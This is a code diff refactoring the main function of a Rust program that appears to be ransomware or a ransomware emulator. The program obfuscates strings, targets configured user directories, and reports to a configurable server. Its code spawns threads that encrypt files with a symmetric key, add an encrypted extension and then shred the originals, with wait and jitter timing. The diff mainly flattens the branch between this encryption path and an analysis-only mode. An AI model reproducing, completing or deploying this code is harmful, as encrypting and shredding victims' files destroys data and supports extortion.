@@ -49,6 +49,7 @@ use ui::{set_window_icon, callback_handler_init};
 
 #[macro_use]
 extern crate litcrypt2;
+extern crate alloc;
 use_litcrypt!();
 
 slint::include_modules!();
@@ -82,7 +83,7 @@ fn main() {
     // Configure the remote server IP address or hostname [required]
     let server_fqdn = lc!("127.0.0.1");
     // Configure the filesystem paths to target [required]
-    let allowlist_paths: Vec<PathBuf> = vec_of_strings!("C:\\Users\\jenki\\Downloads\\Dir1", "C:\\Users\\jenki\\Downloads\\Dir2").iter().map(|s| PathBuf::from(s)).collect();
+    let allowlist_paths: Vec<PathBuf> = vec_of_strings!("C:\\Users\\jenki\\Downloads\\Dir1", "C:\\Users\\jenki\\Downloads\\Dir2").iter().map(PathBuf::from).collect();
     // let allowlist_paths = vec_of_strings!("Contacts", "Desktop", "Documents", "Downloads", "Favorites", "Music", "OneDrive\\Attachments", "OneDrive\\Desktop", "OneDrive\\Documents", "OneDrive\\Pictures", "OneDrive\\Music", "Pictures", "Videos");
     // Configure the filesystem paths to avoid [optional]
     let blocklist_paths: Option<Vec<PathBuf>> = None;
@@ -272,31 +273,29 @@ fn main() {
                 drop(channel_c_receiver);
                 debug!("All shred threads spawned. {} total threads spawned.", thread_handles.len());
             }
-        } else {
-            if analyze_mode {
-                debug!("Analyze mode enabled");
-                thread_handles.push(record(channel_a_receiver.clone(), exe_path_dir_arc.clone()));
-                debug!("Spawned analysis thread");
-                debug!("All analysis threads spawned. {} total threads spawned.", thread_handles.len());
-                drop(channel_a_receiver);
-                drop(channel_c_sender);
-                drop(channel_c_receiver);
-            } else {    
-                for thread_num in 0..num_threads.encrypt_threads {
-                    thread_handles.push(encrypt(channel_a_receiver.clone(),channel_c_sender.clone(), sym_key_arc.clone(), nonce_mutex.clone(), encrypted_extension_arc.clone(), wait_time_arc.clone(), jitter_time_arc.clone()));
-                    debug!("Spawned encryption thread {}", thread_num);
-                }
-                debug!("All encryption threads spawned. {} total threads spawned.", thread_handles.len());
-                drop(channel_a_receiver);
-                drop(channel_c_sender);
-
-                for thread_num in 0..num_threads.shred_threads {
-                    thread_handles.push(shred(channel_c_receiver.clone()));
-                    debug!("Spawned shred thread {}", thread_num);
-                }
-                drop(channel_c_receiver);
-                debug!("All shred threads spawned. {} total threads spawned.", thread_handles.len());
+        } else if analyze_mode {
+            debug!("Analyze mode enabled");
+            thread_handles.push(record(channel_a_receiver.clone(), exe_path_dir_arc.clone()));
+            debug!("Spawned analysis thread");
+            debug!("All analysis threads spawned. {} total threads spawned.", thread_handles.len());
+            drop(channel_a_receiver);
+            drop(channel_c_sender);
+            drop(channel_c_receiver);
+        } else {    
+            for thread_num in 0..num_threads.encrypt_threads {
+                thread_handles.push(encrypt(channel_a_receiver.clone(),channel_c_sender.clone(), sym_key_arc.clone(), nonce_mutex.clone(), encrypted_extension_arc.clone(), wait_time_arc.clone(), jitter_time_arc.clone()));
+                debug!("Spawned encryption thread {}", thread_num);
             }
+            debug!("All encryption threads spawned. {} total threads spawned.", thread_handles.len());
+            drop(channel_a_receiver);
+            drop(channel_c_sender);
+
+            for thread_num in 0..num_threads.shred_threads {
+                thread_handles.push(shred(channel_c_receiver.clone()));
+                debug!("Spawned shred thread {}", thread_num);
+            }
+            drop(channel_c_receiver);
+            debug!("All shred threads spawned. {} total threads spawned.", thread_handles.len());
         }
 
         for handle in thread_handles {
